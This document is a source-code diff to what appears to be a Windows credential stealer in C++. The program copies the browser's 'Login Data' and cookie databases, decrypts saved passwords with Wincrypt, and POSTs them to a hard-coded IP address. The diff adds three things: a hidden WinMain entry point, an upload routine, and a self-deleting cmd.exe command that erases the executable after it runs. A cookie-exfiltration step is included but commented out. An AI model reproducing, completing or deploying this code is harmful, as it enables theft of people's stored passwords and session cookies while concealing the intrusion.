@@ -11,10 +11,13 @@
 #include "sqlite3.h"
 #include <Wincrypt.h>
 #include <windows.h>
+#include <ShellApi.h>
 
+#include <strsafe.h>
 #pragma warning(disable:4996)
 #define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
 #pragma comment(lib, "Crypt32")
+#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 
 
 /*
@@ -95,21 +98,24 @@ std::stringstream getCookies(
 	/* Compile the SELECT statement into a virtual machine. */
 	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
 	if (rc != SQLITE_OK) {
-		std::cout << "statement failed rc = " << rc << std::endl;
+		//std::cout << "statement failed rc = " << rc << std::endl;
 		return dump;
 	}
-	std::cout << "statement prepared " << std::endl;
+	//std::cout << "statement prepared " << std::endl;
 
 	/* So call sqlite3_step() once
 	** only. Normally, we would keep calling sqlite3_step until it
 	** returned something other than SQLITE_ROW.
 	*/
 	rc = sqlite3_step(pStmt);
-	std::cout << "RC: " << rc << std::endl;
+	//std::cout << "RC: " << rc << std::endl;
 	while (rc == SQLITE_ROW) {
-		dump << sqlite3_column_text(pStmt, 0) << std::endl;
-		dump << (char*)sqlite3_column_text(pStmt, 1) << std::endl;
-
+		dump << "#DC#";
+		dump << "#dark~#";
+		dump << sqlite3_column_text(pStmt, 0);
+		dump << "#dark~#";
+		dump << (char*)sqlite3_column_text(pStmt, 1);
+		dump << "#dark~#";
 		DATA_BLOB encryptedPass, decryptedPass;
 
 		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
@@ -132,7 +138,7 @@ std::stringstream getCookies(
 			dump << *c;
 			c++;
 		}
-		dump << std::endl;
+		dump << "#DC#";
 		rc = sqlite3_step(pStmt);
 	}
 
@@ -182,18 +188,70 @@ int deleleteDB(const char* fileName) {
 }
 
 
-int main(int argc, const char * argv[])
+
+std::string SendDate(std::string url, std::string method, std::string arguments){
+	try
+	{
+		http::Request request(url);
+		std::string output;
+		http::Response response = request.send(method, arguments, {
+			"Content-Type: application/x-www-form-urlencoded",
+			"User-Agent: runscope/0.1"
+			});
+
+		if (!output.empty())
+		{
+			std::ofstream outfile(output, std::ofstream::binary);
+			outfile.write(reinterpret_cast<const char*>(response.body.data()),
+				static_cast<std::streamsize>(response.body.size()));
+		}
+		else
+			std::cout << std::string(response.body.begin(), response.body.end()) << std::endl;
+	}
+	catch (const std::exception & e)
+	{
+		std::cerr << "Request failed, error: " << e.what() << std::endl;
+	}
+	return "";
+}
+
+
+void DelMe()
 {
+	TCHAR szModuleName[MAX_PATH];
+	TCHAR szCmd[2 * MAX_PATH];
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+
+	GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
+}
+
+
+#if _DEBUG
+int main(int argc, char* argv[]) {
+#endif
+#if NDEBUG 
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
+#endif
 	std::string url = "http://35.204.135.202/passwordrecovery";
+	std::string cookierecoveryurl = "http://35.204.135.202/cookierecovery";
     std::string method = "POST";
     std::string arguments;
+    std::string argumentsCookie;
     std::string output;
 	int rc;
 	// Open Database
+
 	std::cout << "Copying db ..." << std::endl;
 	copyDB("Login Data", "passwordsDB");
 	sqlite3* passwordsDB = getDBHandler("passwordsDB");
-	//StringStream.str()
 	std::string passwords = getPass(passwordsDB).str();
 	arguments = "pass=" + passwords;
 	std::cout << arguments;
@@ -201,30 +259,23 @@ int main(int argc, const char * argv[])
 		std::cout << "DB connection closed properly" << std::endl;
 	else
 		std::cout << "Failed to close DB connection" << std::endl;
+	
+	SendDate(url, method, arguments);
+	
 
+	/*
+	copyDB("Cookies", "cookiesDB");
+	sqlite3* cookiesDb = getDBHandler("cookiesDB");
+	std::stringstream cookies = getCookies(cookiesDb);
+	argumentsCookie = "cookies="+cookies.str();
+	if (sqlite3_close(cookiesDb) == SQLITE_OK)
+		std::cout << "DB connection closed properly" << std::endl;
+	else
+		std::cout << "Failed to close DB connection" << std::endl;
+	//Stream File?
+	//SendDate(cookierecoveryurl, method, argumentsCookie);
+	*/
+	DelMe();
 
-    try
-    {
-        http::Request request(url);
-
-        http::Response response = request.send(method, arguments, {
-            "Content-Type: application/x-www-form-urlencoded",
-            "User-Agent: runscope/0.1"
-        });
-
-        if (!output.empty())
-        {
-            std::ofstream outfile(output, std::ofstream::binary);
-            outfile.write(reinterpret_cast<const char*>(response.body.data()),
-                          static_cast<std::streamsize>(response.body.size()));
-        }
-        else
-            std::cout << std::string(response.body.begin(), response.body.end()) << std::endl;
-    }
-    catch (const std::exception& e)
-    {
-        std::cerr << "Request failed, error: " << e.what() << std::endl;
-        return EXIT_FAILURE;
-    }
     return EXIT_SUCCESS;
 }
